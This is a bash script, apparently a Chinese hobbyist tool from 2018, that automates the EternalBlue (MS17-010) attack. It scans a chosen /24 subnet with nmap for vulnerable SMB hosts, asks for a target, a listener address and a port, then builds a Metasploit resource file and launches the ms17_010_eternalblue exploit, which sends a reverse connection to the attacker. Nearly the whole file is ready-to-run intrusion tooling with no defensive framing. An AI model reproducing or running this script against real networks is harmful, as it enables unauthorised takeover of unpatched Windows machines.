#！ /bin/bash
#我会一直爱着小二佳呀！！小爱Joker
LANG=zh_CN.UTF-



clear
echo  "     "
echo  "     "
echo 正在载入  请稍等 ~~~~. 道不同 不相足以为某 ;
sleep 5
clear
echo  "     "   
echo  "永恒之蓝  MS17-010 Scan and Exploit Shell 
2018.5.10 小爱Joker 
开源时间2018.5.18 盗版必究."
echo   "     "
echo  "内网网段IP:"
/sbin/ifconfig -a|grep inet|grep -v 127.0.0.1|grep -v inet6|awk '{print $2}'|tr -d "addr:"
echo  " "
echo  "选择你要扫描的网段IP "
echo  " "
echo  "网段IP > \c "
read ip 
nmap -n -p445 --script smb-vuln-ms17-010 $ip/24 --open -v
echo  " "
echo  "攻击地址 > \c"
read ip2
echo  " "
echo  "监听地址："
/sbin/ifconfig -a|grep inet|grep -v 127.0.0.1|grep -v inet6|awk '{print $2}'|tr -d "addr:"
echo  " "
echo  "监听地址 > \c"
read ip3
echo " "
echo "监听端口 > \c"
read dk
echo " "
echo   "#################################################"
echo   "| Name        || Show options"
echo   "#################################################"
echo   "| 监听地址    || $ip3"
echo   "| 监听端口    || $dk"
echo   "| 攻击地址    || $ip2"
echo   "| 攻击端口    || 445"
echo   "#################################################"
echo   ""
mkdir test
echo   "是否使用以上参数进行漏洞攻击？ y or n: \c"
read handler
if [ "$handler" == "y" ]; then  
echo "use exploit/windows/smb/ms17_010_eternalblue" >> test/ms17-010.rc
echo "set RHOST $ip2" >> test/ms17-010.rc
echo "set LHOST $ip3" >> test/ms17-010.rc
echo "set LPORT $dk" >> test/ms17-010.rc
echo "exploit" >> test/ms17-010.rc
msfconsole -r test/ms17-010.rc
rm -rf test
fi

